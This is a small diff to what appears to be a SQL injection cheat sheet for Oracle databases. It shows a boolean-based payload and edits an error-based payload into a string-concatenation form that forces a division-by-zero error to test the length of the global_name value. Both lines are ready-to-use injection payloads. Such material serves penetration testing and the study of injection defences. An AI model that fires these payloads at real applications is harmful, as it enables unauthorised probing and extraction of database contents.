@@ -59,7 +59,7 @@ Examples:
 1' AND (SELECT LENGTH(global_name) FROM global_name)=1--
 
 #Error Based  
-1' SELECT CASE WHEN ((SELECT LENGTH(global_name) FROM global_name)=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--
+1' || SELECT CASE WHEN ((SELECT LENGTH(global_name) FROM global_name)=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual ||--
 ```
 {% endtab %}
 
